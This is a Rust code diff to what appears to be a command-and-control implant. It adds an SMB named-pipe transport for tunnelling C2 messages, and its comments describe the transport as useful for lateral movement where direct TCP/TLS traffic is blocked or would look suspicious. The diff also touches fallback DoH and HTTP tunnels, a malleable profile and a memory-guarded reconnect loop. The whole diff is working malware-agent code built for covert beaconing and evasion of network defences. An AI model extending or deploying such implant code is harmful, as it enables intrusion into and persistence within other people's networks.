@@ -37,7 +37,8 @@ use common::tls_transport::{PinnedCertVerifier, TlsTransport};
     not(feature = "forward-secrecy"),
     feature = "doh-transport",
     feature = "http-transport",
-    feature = "ssh-transport"
+    feature = "ssh-transport",
+    feature = "smb-pipe-transport"
 ))]
 use common::CryptoSession;
 use common::{Message, Transport};
@@ -198,6 +199,7 @@ pub async fn build_outbound_transport(
     let config_result = crate::config::load_config();
     #[cfg(any(
         feature = "ssh-transport",
+        feature = "smb-pipe-transport",
         feature = "doh-transport",
         feature = "http-transport"
     ))]
@@ -221,6 +223,46 @@ pub async fn build_outbound_transport(
                             .await
                             .map_err(|e| anyhow!("SshTransport init failed: {e}"))?,
                     ));
+                }
+
+                // SMB/TCP named-pipe transport: tunnel C2 messages through a
+                // Windows named pipe over SMB or via a local TCP relay.  Useful
+                // for lateral movement through SMB-enabled networks where direct
+                // TCP/TLS is blocked or suspicious.  Requires smb_pipe_enabled
+                // and smb_pipe_host in the malleable profile.  On failure, falls
+                // through to the next transport (not fatal).
+                #[cfg(feature = "smb-pipe-transport")]
+                if cfg.malleable_profile.smb_pipe_enabled
+                    && cfg
+                        .malleable_profile
+                        .smb_pipe_host
+                        .as_deref()
+                        .filter(|s| !s.is_empty())
+                        .is_some()
+                {
+                    info!(
+                        "smb-pipe-transport: smb_pipe_enabled=true, host={}; \
+                         attempting SmbPipeTransport",
+                        cfg.malleable_profile.smb_pipe_host.as_deref().unwrap_or("?")
+                    );
+                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+                    match crate::c2_smb::SmbPipeTransport::new(
+                        &cfg.malleable_profile,
+                        session,
+                    )
+                    .await
+                    {
+                        Ok(transport) => {
+                            info!("smb-pipe-transport: connected successfully");
+                            return Ok(Box::new(transport));
+                        }
+                        Err(e) => {
+                            warn!(
+                                "smb-pipe-transport: connection failed ({e:#}); \
+                                 falling through to next transport"
+                            );
+                        }
+                    }
                 }
 
                 // DoH transport: tunnel C2 messages through DNS TXT records sent
@@ -446,7 +488,7 @@ pub async fn run_forever() -> Result<()> {
                 error!("outbound-c: session ended: {e:#}");
                 warn!("outbound-c: reconnecting in {backoff:?}");
                 // Protect sensitive memory while waiting to reconnect.
-                if let Err(ge) = crate::memory_guard::guarded_sleep(backoff, None).await {
+                if let Err(ge) = crate::memory_guard::guarded_sleep(backoff, None, 0).await {
                     error!("[memory-guard] error during reconnect backoff: {ge}");
                     sleep(backoff).await;
                 }
